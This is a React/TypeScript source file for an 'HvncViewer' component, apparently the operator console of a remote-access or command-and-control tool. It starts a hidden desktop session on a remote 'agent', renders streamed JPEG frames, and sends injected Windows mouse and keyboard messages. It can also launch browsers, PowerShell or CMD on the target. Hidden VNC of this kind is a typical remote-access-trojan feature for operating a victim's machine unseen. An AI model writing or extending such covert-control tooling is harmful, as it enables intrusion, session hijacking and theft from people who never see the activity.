import { useState, useEffect, useRef } from 'react';
import { Box, Button, Chip, Slider, Typography, CircularProgress, Menu, MenuItem } from '@mui/material';
import { Monitor, Power, PowerOff, Play, FolderOpen, Terminal } from 'lucide-react';
import { wsSend, wsFire, onBinaryMessage } from '../hooks/useWebSocket';
import { useNotify } from '../context/NotifyContext';

interface Props {
    agentId: string;
}

const LAUNCH_APPS = [
    { label: 'Explorer', value: 'explorer' },
    { label: 'Chrome', value: 'chrome' },
    { label: 'Edge', value: 'edge' },
    { label: 'Brave', value: 'brave' },
    { label: 'Firefox', value: 'firefox' },
    { label: 'PowerShell', value: 'powershell' },
    { label: 'CMD', value: 'cmd' },
];

/** Map browser key names to Windows Virtual Key codes (module-scope to avoid re-creation per render). */
const vkMap: Record<string, number> = {
    Backspace: 0x08, Tab: 0x09, Enter: 0x0D, Escape: 0x1B, ' ': 0x20,
    End: 0x23, Home: 0x24, ArrowLeft: 0x25, ArrowUp: 0x26, ArrowRight: 0x27, ArrowDown: 0x28,
    Insert: 0x2D, Delete: 0x2E, PageUp: 0x21, PageDown: 0x22,
    F1: 0x70, F2: 0x71, F3: 0x72, F4: 0x73, F5: 0x74, F6: 0x75,
    F7: 0x76, F8: 0x77, F9: 0x78, F10: 0x79, F11: 0x7A, F12: 0x7B,
    Shift: 0x10, Control: 0x11, Alt: 0x12, CapsLock: 0x14,
};

/** Parse the 16-byte UUID from binary frame header into a string. */
function uuidFromBytes(buf: Uint8Array): string {
    const hex = Array.from(buf.slice(0, 16)).map(b => b.toString(16).padStart(2, '0')).join('');
    return `${hex.slice(0,8)}-${hex.slice(8,12)}-${hex.slice(12,16)}-${hex.slice(16,20)}-${hex.slice(20,32)}`;
}

export default function HvncViewer({ agentId }: Props) {
    const notify = useNotify();
    const canvasRef = useRef<HTMLCanvasElement>(null);

    const [active, setActive] = useState(false);
    const [starting, setStarting] = useState(false);
    const [stopping, setStopping] = useState(false);
    const [quality, setQuality] = useState(30);
    const [hasFrame, setHasFrame] = useState(false);

    const fpsRef = useRef(0);
    const remoteWRef = useRef(0);
    const remoteHRef = useRef(0);
    const fpsDisplayRef = useRef<HTMLSpanElement>(null);
    const resDisplayRef = useRef<HTMLSpanElement>(null);

    const activeRef = useRef(false);
    const frameCountRef = useRef(0);
    const hasFrameRef = useRef(false);
    const startTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
    const ctxRef = useRef<CanvasRenderingContext2D | null>(null);

    const [launchAnchor, setLaunchAnchor] = useState<null | HTMLElement>(null);

    // Check initial status via WS
    useEffect(() => {
        wsSend('hvnc.status', { agent_id: agentId }).then((r: any) => {
            if (r?.active) {
                setActive(true);
                activeRef.current = true;
                remoteWRef.current = r.width || 0;
                remoteHRef.current = r.height || 0;
                if (resDisplayRef.current) resDisplayRef.current.textContent = `${remoteWRef.current}x${remoteHRef.current}`;
            }
        }).catch(() => {});
    }, [agentId]);

    // Cleanup start timer on unmount
    useEffect(() => {
        return () => {
            if (startTimerRef.current) {
                clearTimeout(startTimerRef.current);
                startTimerRef.current = null;
            }
        };
    }, []);

    // FPS counter
    useEffect(() => {
        const iv = setInterval(() => {
            fpsRef.current = frameCountRef.current;
            frameCountRef.current = 0;
            if (fpsDisplayRef.current) fpsDisplayRef.current.textContent = String(fpsRef.current);
        }, 1000);
        return () => clearInterval(iv);
    }, []);

    // Subscribe to binary WS frames for HVNC
    useEffect(() => {
        if (!active) return;
        activeRef.current = true;

        let dbgCount = 0;
        const unsub = onBinaryMessage((buf: ArrayBuffer) => {
            if (!activeRef.current) return;
            // Binary frame format: 16-byte agentID + 4-byte LE width + 4-byte LE height + JPEG
            if (buf.byteLength < 24) return;

            const view = new DataView(buf);
            const bytes = new Uint8Array(buf);
            const frameAgentId = uuidFromBytes(bytes);

            // Debug: log first few frames and periodic updates
            dbgCount++;
            if (import.meta.env.DEV && (dbgCount <= 3 || dbgCount % 50 === 0)) {
                console.log(`[hvnc-ws] frame #${dbgCount} size=${buf.byteLength} frameAgent=${frameAgentId} myAgent=${agentId} match=${frameAgentId === agentId}`);
            }

            // Only process frames for this agent
            if (frameAgentId !== agentId) return;

            const w = view.getUint32(16, true);
            const h = view.getUint32(20, true);
            const jpegData = buf.slice(24);

            // Create blob and render
            const blob = new Blob([jpegData], { type: 'image/jpeg' });
            createImageBitmap(blob).then(bitmap => {
                const canvas = canvasRef.current;
                if (canvas) {
                    canvas.width = bitmap.width;
                    canvas.height = bitmap.height;
                    if (!ctxRef.current) ctxRef.current = canvas.getContext('2d');
                    if (ctxRef.current) ctxRef.current.drawImage(bitmap, 0, 0);
                }
                bitmap.close();

                if (w) remoteWRef.current = w;
                if (h) remoteHRef.current = h;
                if ((w || h) && resDisplayRef.current) resDisplayRef.current.textContent = `${remoteWRef.current}x${remoteHRef.current}`;
                if (!hasFrameRef.current) {
                    hasFrameRef.current = true;
                    setHasFrame(true);
                }
                frameCountRef.current++;
            }).catch(() => {});
        });

        return () => {
            activeRef.current = false;
            unsub();
        };
    }, [active, agentId]);

    const handleStart = async () => {
        setStarting(true);
        try {
            await wsSend('hvnc.start', { agent_id: agentId, quality: String(quality) });
            notify('HVNC starting...', 'info');
            startTimerRef.current = setTimeout(() => {
                startTimerRef.current = null;
                hasFrameRef.current = false;
                setHasFrame(false);
                setActive(true);
                setStarting(false);
            }, 2000);
        } catch (err: any) {
            notify('HVNC start failed: ' + (err.message || err), 'error');
            setStarting(false);
        }
    };

    const handleStop = async () => {
        if (startTimerRef.current) {
            clearTimeout(startTimerRef.current);
            startTimerRef.current = null;
        }
        setStopping(true);
        try {
            await wsSend('hvnc.stop', { agent_id: agentId });
            setActive(false);
            hasFrameRef.current = false;
            setHasFrame(false);
            remoteWRef.current = 0;
            remoteHRef.current = 0;
            if (resDisplayRef.current) resDisplayRef.current.textContent = '';
            if (fpsDisplayRef.current) fpsDisplayRef.current.textContent = '0';
            notify('HVNC stopped', 'info');
        } catch (err: any) {
            notify('HVNC stop failed: ' + (err.message || err), 'error');
        } finally {
            setStopping(false);
        }
    };

    const handleLaunch = async (app: string) => {
        setLaunchAnchor(null);
        try {
            await wsSend('hvnc.launch', { agent_id: agentId, action: app });
        } catch (err: any) {
            notify('Launch failed: ' + (err.message || err), 'error');
        }
    };

    // Mouse event helpers
    const getScaledCoords = (e: React.MouseEvent<HTMLCanvasElement>) => {
        const canvas = canvasRef.current;
        if (!canvas || !remoteWRef.current || !remoteHRef.current) return null;
        const rect = canvas.getBoundingClientRect();
        const scaleX = remoteWRef.current / rect.width;
        const scaleY = remoteHRef.current / rect.height;
        const x = Math.round(e.nativeEvent.offsetX * scaleX);
        const y = Math.round(e.nativeEvent.offsetY * scaleY);
        return { x, y, lparam: (y << 16) | (x & 0xFFFF) };
    };

    const inputCountRef = useRef(0);
    const sendInput = (msg: number, wparam: number, lparam: number) => {
        const count = ++inputCountRef.current;
        if (import.meta.env.DEV && (count <= 10 || count % 50 === 0)) {
            console.log(`[hvnc-send] #${count} msg=0x${msg.toString(16)} wp=${wparam} lp=${lparam} agent=${agentId}`);
        }
        wsFire('hvnc.input', { agent_id: agentId, msg, wparam, lparam });
    };

    // Send all mouse events naturally — agent detects double-clicks locally
    // from consecutive WM_LBUTTONDOWN timing (immune to network latency)

    const handleMouseDown = (e: React.MouseEvent<HTMLCanvasElement>) => {
        const coords = getScaledCoords(e);
        if (!coords) {
            if (import.meta.env.DEV) console.warn('[hvnc] mouseDown: no coords', { active, remoteW: remoteWRef.current, remoteH: remoteHRef.current });
            return;
        }
        e.preventDefault();
        canvasRef.current?.focus();
        if (e.button === 0) sendInput(0x0201, 0x0001, coords.lparam);
        else if (e.button === 2) sendInput(0x0204, 0x0002, coords.lparam);
    };

    const handleMouseUp = (e: React.MouseEvent<HTMLCanvasElement>) => {
        const coords = getScaledCoords(e);
        if (!coords) return;
        e.preventDefault();
        if (e.button === 0) sendInput(0x0202, 0, coords.lparam);
        else if (e.button === 2) sendInput(0x0205, 0, coords.lparam);
    };

    const lastMoveRef = useRef(0);
    const handleMouseMove = (e: React.MouseEvent<HTMLCanvasElement>) => {
        if (e.buttons === 0) return;
        const now = performance.now();
        if (now - lastMoveRef.current < 32) return; // ~30fps max for moves
        lastMoveRef.current = now;
        const coords = getScaledCoords(e);
        if (!coords) return;
        sendInput(0x0200, e.buttons === 1 ? 0x0001 : 0, coords.lparam);
    };

    const handleWheel = (e: React.WheelEvent<HTMLCanvasElement>) => {
        const coords = getScaledCoords(e as unknown as React.MouseEvent<HTMLCanvasElement>);
        if (!coords) return;
        e.preventDefault();
        const delta = e.deltaY > 0 ? -120 : 120;
        sendInput(0x020A, (delta & 0xFFFF) << 16, coords.lparam);
    };

    // No-op: agent handles double-click detection locally
    const handleDoubleClick = (e: React.MouseEvent<HTMLCanvasElement>) => {
        e.preventDefault();
    };

    const handleContextMenu = (e: React.MouseEvent<HTMLCanvasElement>) => {
        e.preventDefault();
    };

    const getVK = (e: React.KeyboardEvent): number | null => {
        if (vkMap[e.key] !== undefined) return vkMap[e.key];
        // Single printable char: VK code = uppercase char code for A-Z, 0-9
        if (e.key.length === 1) {
            const c = e.key.toUpperCase().charCodeAt(0);
            if (c >= 0x20 && c <= 0x7E) return c;
        }
        return null;
    };

    const handleKeyDown = (e: React.KeyboardEvent<HTMLCanvasElement>) => {
        if (!active) return;
        e.preventDefault();
        const vk = getVK(e);
        if (vk !== null) {
            // Send WM_KEYDOWN with lparam repeat count = 1
            sendInput(0x0100, vk, 1);
            // For printable characters, also send WM_CHAR with the actual character
            if (e.key.length === 1) {
                sendInput(0x0102, e.key.charCodeAt(0), 1);
            }
        }
    };

    const handleKeyUp = (e: React.KeyboardEvent<HTMLCanvasElement>) => {
        if (!active) return;
        e.preventDefault();
        const vk = getVK(e);
        if (vk !== null) {
            // WM_KEYUP: bit 31 (transition) and bit 30 (was down) set
            sendInput(0x0101, vk, (1 << 31) | (1 << 30) | 1);
        }
    };

    return (
        <Box sx={{ display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' }}>
            {/* Toolbar */}
            <Box sx={{
                display: 'flex', alignItems: 'center', gap: 1.5, px: 1.5, py: 0.75,
                bgcolor: 'background.paper', borderBottom: '1px solid', borderColor: 'divider', flexShrink: 0,
            }}>
                {!active ? (
                    <Button
                        variant="contained" color="success" size="small"
                        startIcon={starting ? <CircularProgress size={12} color="inherit" /> : <Power size={14} />}
                        onClick={handleStart} disabled={starting}
                        sx={{ textTransform: 'none', fontWeight: 'bold', fontSize: '0.75rem', height: 28 }}
                    >
                        {starting ? 'Starting...' : 'Start HVNC'}
                    </Button>
                ) : (
                    <Button
                        variant="outlined" color="error" size="small"
                        startIcon={stopping ? <CircularProgress size={12} color="inherit" /> : <PowerOff size={14} />}
                        onClick={handleStop} disabled={stopping}
                        sx={{ textTransform: 'none', fontWeight: 'bold', fontSize: '0.75rem', height: 28 }}
                    >
                        {stopping ? 'Stopping...' : 'Stop'}
                    </Button>
                )}

                {active && (
                    <>
                        <Box sx={{ width: '1px', height: 20, bgcolor: 'divider' }} />
                        <Button
                            variant="outlined" size="small"
                            startIcon={<FolderOpen size={12} />}
                            onClick={() => handleLaunch('explorer')}
                            sx={{ textTransform: 'none', fontSize: '0.75rem', height: 28 }}
                        >
                            Explorer
                        </Button>
                        <Button
                            variant="outlined" size="small"
                            startIcon={<Terminal size={12} />}
                            onClick={() => handleLaunch('cmd')}
                            sx={{ textTransform: 'none', fontSize: '0.75rem', height: 28 }}
                        >
                            CMD
                        </Button>
                        <Button
                            variant="outlined" size="small"
                            startIcon={<Play size={12} />}
                            onClick={(e) => setLaunchAnchor(e.currentTarget)}
                            sx={{ textTransform: 'none', fontSize: '0.75rem', height: 28, minWidth: 'auto' }}
                        >
                            More
                        </Button>
                        <Menu anchorEl={launchAnchor} open={!!launchAnchor} onClose={() => setLaunchAnchor(null)}
                            slotProps={{ paper: { sx: { bgcolor: 'background.paper', border: '1px solid', borderColor: 'divider' } } }}>
                            {LAUNCH_APPS.map(app => (
                                <MenuItem key={app.value} onClick={() => handleLaunch(app.value)}
                                    sx={{ fontSize: '0.8rem', fontFamily: 'monospace', minHeight: 32 }}>
                                    {app.label}
                                </MenuItem>
                            ))}
                        </Menu>
                    </>
                )}

                <Box sx={{ width: '1px', height: 20, bgcolor: 'divider' }} />

                <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, minWidth: 160 }}>
                    <Typography variant="caption" color="text.secondary" fontSize="0.7rem" sx={{ whiteSpace: 'nowrap' }}>
                        Quality
                    </Typography>
                    <Slider
                        value={quality} min={10} max={95} step={5}
                        onChange={(_, v) => setQuality(v as number)}
                        size="small"
                        sx={{ width: 100, '& .MuiSlider-thumb': { width: 12, height: 12 } }}
                    />
                    <Typography variant="caption" color="text.secondary" fontFamily="monospace" fontSize="0.7rem" sx={{ width: 20 }}>
                        {quality}
                    </Typography>
                </Box>

                <Box sx={{ flex: 1 }} />

                <Chip
                    label={active ? 'ACTIVE' : 'INACTIVE'}
                    size="small"
                    color={active ? 'success' : 'default'}
                    variant={active ? 'filled' : 'outlined'}
                    sx={{ height: 20, fontSize: '0.6rem', fontWeight: 'bold', letterSpacing: 1,
                        ...(active && { bgcolor: 'success.main', color: '#1d2021' }) }}
                />
                {active && (
                    <Typography variant="caption" color="text.disabled" fontFamily="monospace" fontSize="0.65rem">
                        <span ref={resDisplayRef}>0x0</span>
                    </Typography>
                )}
                {active && (
                    <Typography variant="caption" color="text.disabled" fontFamily="monospace" fontSize="0.65rem">
                        <span ref={fpsDisplayRef}>0</span> fps
                    </Typography>
                )}
            </Box>

            {/* Canvas area */}
            <Box sx={{
                flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center',
                bgcolor: '#1d2021', overflow: 'hidden', minHeight: 0, position: 'relative',
            }}>
                {!active && !hasFrame && (
                    <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 1.5, opacity: 0.4 }}>
                        <Monitor size={48} />
                        <Typography variant="caption" color="text.disabled">
                            Click "Start HVNC" to begin a hidden desktop session
                        </Typography>
                    </Box>
                )}

                {active && !hasFrame && (
                    <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 1.5 }}>
                        <CircularProgress color="secondary" size={32} />
                        <Typography variant="caption" color="text.secondary">Waiting for first frame...</Typography>
                    </Box>
                )}

                <canvas
                    ref={canvasRef}
                    tabIndex={0}
                    style={{
                        maxWidth: '100%',
                        maxHeight: '100%',
                        objectFit: 'contain',
                        cursor: active ? 'crosshair' : 'default',
                        outline: 'none',
                        visibility: hasFrame ? 'visible' : 'hidden',
                        position: hasFrame ? 'static' : 'absolute',
                    }}
                    onMouseDown={handleMouseDown}
                    onMouseUp={handleMouseUp}
                    onMouseMove={handleMouseMove}
                    onDoubleClick={handleDoubleClick}
                    onContextMenu={handleContextMenu}
                    onKeyDown={handleKeyDown}
                    onKeyUp={handleKeyUp}
                    onWheel={handleWheel}
                />
            </Box>
        </Box>
    );
}
